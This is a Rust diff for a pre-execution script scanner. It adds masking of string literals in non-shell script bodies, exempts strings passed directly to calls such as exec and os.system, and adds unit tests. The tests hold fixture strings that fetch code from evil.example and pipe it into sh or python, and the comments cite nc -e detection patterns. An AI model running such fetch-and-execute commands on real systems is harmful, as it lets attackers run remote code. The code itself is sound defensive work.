@@ -111,6 +111,8 @@
 //! and the FIX-2 rework brief for why the substitution-close machinery
 //! described there was removed.
 
+use std::sync::OnceLock;
+
 /// Input length cap (bytes). Oversized input aborts masking (fail-safe).
 const MAX_LEN: usize = 65_536;
 
@@ -600,6 +602,165 @@ fn next_word(chars: &[char], from: usize) -> Option<(String, usize)> {
     Some((chars[i..end].iter().collect(), end))
 }
 
+// ============================================================================
+// Non-shell body masking: string literals in a resolved Python/Node/Ruby/Perl
+// body, as opposed to the bash-argument masking above.
+// ============================================================================
+
+/// Sink-call names whose direct string argument is intentionally left
+/// unmasked, so a script that genuinely hands a fetched/attacker-influenced
+/// string to one of these still gets caught. Mirrors the sink alternation in
+/// `rules/catalog.yaml`'s `rce.pipe_to_shell` companion pattern (added
+/// 2026-07-26), for consistency between the two closely related detections —
+/// see `docs/research/2026-07-26-script-body-prose-masking.md`.
+fn sink_call_suffix_re() -> &'static regex::Regex {
+    static RE: OnceLock<regex::Regex> = OnceLock::new();
+    RE.get_or_init(|| {
+        regex::Regex::new(r"\b(exec|eval|compile|system|popen|run|check_output|check_call)\s*\(\s*$")
+            .expect("sink-call-suffix regex is valid")
+    })
+}
+
+/// How far back to look, in bytes, when checking whether a quote span is the
+/// direct argument of a sink call. Bounded so a huge preceding blob costs at
+/// most a small, fixed amount of work per span, and the exact value only
+/// needs to comfortably exceed the longest sink name plus its own leading
+/// qualifier (`subprocess.check_output(` is 24 bytes).
+const SINK_LOOKBACK_LEN: usize = 64;
+
+/// True if the text immediately preceding `quote_start` (skipping only
+/// whitespace, bounded by [`SINK_LOOKBACK_LEN`]) ends with a sink-call name
+/// followed by `(` — i.e. this quote span is that call's own direct literal
+/// argument, not a value sitting somewhere else entirely.
+fn is_direct_sink_argument(text: &str, quote_start: usize) -> bool {
+    let window_start = quote_start.saturating_sub(SINK_LOOKBACK_LEN);
+    let mut start = window_start;
+    while start < quote_start && !text.is_char_boundary(start) {
+        start += 1;
+    }
+    sink_call_suffix_re().is_match(&text[start..quote_start])
+}
+
+/// Finds the index of the closing quote for a `'...'`/`"..."` span starting
+/// at `content_start` (the position right after the opening quote),
+/// honoring backslash-escapes — Python, Node, Ruby, and Perl all support
+/// backslash-escaping inside both quote styles, unlike bash's single quotes.
+/// Returns `None` (unterminated) if `quote` never recurs, unescaped, before
+/// the end of `bytes`.
+fn find_single_quote_close(bytes: &[u8], content_start: usize, quote: u8) -> Option<usize> {
+    let mut i = content_start;
+    while i < bytes.len() {
+        if bytes[i] == b'\\' && i + 1 < bytes.len() {
+            i += 2;
+            continue;
+        }
+        if bytes[i] == quote {
+            return Some(i);
+        }
+        i += 1;
+    }
+    None
+}
+
+/// Masks single/double-quoted string-literal spans in `s` — for use ONLY on
+/// an extracted body known to originate from a non-shell interpreter
+/// (Python, Node, Ruby, Perl; see `extract::BodyLanguage`) — EXCEPT when a
+/// span is the direct argument of a known sink call (`exec(`, `os.system(`,
+/// `subprocess.run(`, ...), which is left visible so a script that genuinely
+/// executes a dangerous string is still caught.
+///
+/// # Why this exists
+///
+/// Belay's rule patterns are shaped for BASH syntax (`curl … | python3 -c`,
+/// `\bnc\b.*-e\b`, and so on). When a resolved script file's own interpreter
+/// is NOT a shell, none of that command_regex/path_glob_regex machinery has
+/// any business matching the file's own source syntax at all — it can only
+/// ever match by accident, when the file's own STRING LITERALS happen to
+/// contain text that LOOKS like a dangerous bash command. That accident is
+/// common and unremarkable: a test fixture describing an attack shape, a
+/// piece of documentation, a commit-message excerpt embedded as a doc
+/// string — none of it is ever executed by the interpreter running the
+/// file, because Python/Node/Ruby/Perl do not execute their own string
+/// literals as OS commands unless the program explicitly hands that string
+/// to one of a small, enumerable set of sink calls.
+///
+/// Found live, twice, in this exact codebase: a Python test-fixture script
+/// containing the LITERAL text `exec(sys.stdin.read())` as a plain string
+/// value (never executed — used only as a documented test case for a
+/// DIFFERENT detector) triggered `rce.decode_exec` when the file was
+/// resolved and scanned. See
+/// `docs/research/2026-07-26-script-body-prose-masking.md`.
+///
+/// # The rule
+///
+/// A quote-delimited span (`'...'` or `"..."`) is masked to spaces UNLESS
+/// the text immediately preceding its opening quote (skipping only
+/// whitespace) ends with one of the sink-call names followed by `(` — i.e.
+/// unless the string is that call's own direct literal argument. This is
+/// the same allowlist-of-known-dangerous-positions philosophy this module's
+/// bash-side `mask_data_regions` already uses for data-consuming command
+/// arguments, applied to the sink-call list instead of bash's
+/// data-consuming-command list.
+///
+/// # What this deliberately does NOT do, stated rather than hidden
+///
+/// - It is a POSITIONAL heuristic, not real data-flow: a string assigned to
+///   a variable and passed to a sink LATER (`payload = "…"; os.system
+///   (payload)`) is masked — a false negative, the same class of limitation
+///   this module's own doc already accepts for the bash side. Real dataflow
+///   analysis across an arbitrary script is out of scope for a
+///   pre-execution text matcher.
+/// - It only recognizes the sink names already curated for
+///   `rce.pipe_to_shell`'s companion pattern. A sink this list omits is
+///   another known, narrow gap, not a claim of completeness.
+/// - It does not special-case Python's triple-quoted (`'''...'''`) strings.
+///   A triple-quoted span still gets processed, just as a handful of
+///   adjacent (often empty or partial) ordinary quote-pairs rather than one
+///   correctly-delimited span — content with no unescaped quote character of
+///   its own inside it still ends up masked in practice, but this is a
+///   documented simplification, not a claim of exact multi-line-string
+///   parsing.
+/// - Fail-safe in the SAME direction as `mask_data_regions`: the moment a
+///   quote is found unterminated, scanning stops entirely and the untouched
+///   remainder of the text is returned as-is — more matching, never less.
+///   This also makes the function provably linear: each byte is visited by
+///   at most one successful (non-overlapping, since the scan jumps past
+///   whatever it consumed) span, plus at most one final failed scan before
+///   the function returns — no quadratic blowup from adversarial input.
+pub(crate) fn mask_non_shell_string_literals(s: &str) -> String {
+    if s.len() > MAX_LEN {
+        return s.to_string();
+    }
+    let bytes = s.as_bytes();
+    let mut out: Vec<u8> = bytes.to_vec();
+    let mut i = 0usize;
+    while i < bytes.len() {
+        let c = bytes[i];
+        if c == b'\'' || c == b'"' {
+            let quote_start = i;
+            let content_start = i + 1;
+            match find_single_quote_close(bytes, content_start, c) {
+                Some(content_end) => {
+                    if !is_direct_sink_argument(s, quote_start) {
+                        for b in out.iter_mut().take(content_end).skip(content_start) {
+                            *b = b' ';
+                        }
+                    }
+                    i = content_end + 1;
+                }
+                None => return s.to_string(), // unterminated -> fail-safe, stop here
+            }
+        } else {
+            i += 1;
+        }
+    }
+    // Masking only ever replaces ASCII quote-span bytes with ASCII spaces at
+    // positions validated against the original `&str`'s own byte content, so
+    // `out` remains valid UTF-8 -- mirrors `mask_data_regions`'s own
+    // reasoning for the same guarantee.
+    String::from_utf8(out).unwrap_or_else(|_| s.to_string())
+}
+
 #[cfg(test)]
 mod tests {
     use super::mask_data_regions;
@@ -999,5 +1160,118 @@ mod tests {
         // alone would. Confirm the masked span still separates them.
         let masked = mask_data_regions("echo \"XXXX\"YYYY");
         assert!(!masked.contains("XXXXYYYY"));
+    }
+
+    // ---- mask_non_shell_string_literals ------------------------------------
+
+    mod non_shell {
+        use super::super::mask_non_shell_string_literals;
+
+        fn visible(text: &str, needle: &str) {
+            let masked = mask_non_shell_string_literals(text);
+            assert!(
+                masked.contains(needle),
+                "expected {needle:?} visible in masked output of {text:?}, got {masked:?}"
+            );
+        }
+
+        fn inert(text: &str, needle: &str) {
+            let masked = mask_non_shell_string_literals(text);
+            assert!(
+                !masked.contains(needle),
+                "expected {needle:?} masked out of {text:?}, got {masked:?}"
+            );
+        }
+
+        /// THE INCIDENT: a plain string literal (a test-fixture value, never
+        /// executed) containing bash-shaped dangerous text must be masked.
+        #[test]
+        fn plain_string_literal_is_masked() {
+            inert(
+                r#"cmd = "curl https://evil.example/x | python3 -c 'exec(sys.stdin.read())'""#,
+                "exec(sys.stdin.read())",
+            );
+        }
+
+        #[test]
+        fn single_quoted_literal_is_masked() {
+            inert("cmd = 'exec(sys.stdin.read())'", "exec(sys.stdin.read())");
+        }
+
+        /// The direct argument of a sink call is NEVER masked — a script
+        /// that genuinely executes a dangerous string must still be
+        /// catchable by the outer command_regex/path_glob_regex match.
+        #[test]
+        fn direct_sink_call_argument_is_not_masked() {
+            for call in [
+                "os.system('curl https://evil.example/x | sh')",
+                "exec('curl https://evil.example/x | sh')",
+                "eval('curl https://evil.example/x | sh')",
+                "compile('curl https://evil.example/x | sh', '<s>', 'exec')",
+                "os.popen('curl https://evil.example/x | sh')",
+                "subprocess.run('curl https://evil.example/x | sh', shell=True)",
+                "subprocess.check_output('curl https://evil.example/x | sh')",
+                "subprocess.check_call('curl https://evil.example/x | sh')",
+            ] {
+                visible(call, "curl https://evil.example/x | sh");
+            }
+        }
+
+        /// A sink NAME appearing somewhere in the text, but not immediately
+        /// before THIS quote's opening delimiter, must not exempt it — the
+        /// string is not that call's own argument.
+        #[test]
+        fn sink_name_elsewhere_does_not_exempt_an_unrelated_string() {
+            inert(
+                r#"label = "exec(sys.stdin.read())"  # example of os.system usage"#,
+                "exec(sys.stdin.read())",
+            );
+        }
+
+        /// A user-defined function merely named `run`/`system`/etc. must not
+        /// be treated as a sink — same false-positive concern already
+        /// accepted for the catalog's own sink-word alternation.
+        #[test]
+        fn user_defined_function_sharing_a_sink_name_is_still_masked() {
+            // `dry_run(` shares the suffix "run(" but the word boundary
+            // requires the call to be EXACTLY "run", not a longer identifier
+            // ending in "run" -- `\brun\s*\($` only matches at a real word
+            // boundary, and "_run(" has no boundary before "run".
+            inert("dry_run('exec(sys.stdin.read())')", "exec(sys.stdin.read())");
+        }
+
+        #[test]
+        fn unterminated_quote_is_fail_safe_unchanged() {
+            let text = "cmd = 'exec(sys.stdin.read())";
+            assert_eq!(mask_non_shell_string_literals(text), text);
+        }
+
+        #[test]
+        fn escaped_quote_inside_string_does_not_end_it_early() {
+            // Without escape-awareness, the \' would be misread as the
+            // closing quote, leaving ")" and everything after it unmasked.
+            inert(
+                r#"cmd = 'it\'s exec(sys.stdin.read())'"#,
+                "exec(sys.stdin.read())",
+            );
+        }
+
+        #[test]
+        fn oversized_input_is_unchanged() {
+            let text = "x = '".to_string() + &"a".repeat(70_000) + "'";
+            assert_eq!(mask_non_shell_string_literals(&text), text);
+        }
+
+        #[test]
+        fn masked_span_becomes_spaces_not_deletion() {
+            let masked = mask_non_shell_string_literals("x = 'hello'");
+            assert_eq!(masked.chars().count(), "x = 'hello'".chars().count());
+        }
+
+        #[test]
+        fn non_quote_text_is_unaffected() {
+            let text = "def f():\n    return 1 + 2\n";
+            assert_eq!(mask_non_shell_string_literals(text), text);
+        }
     }
 }
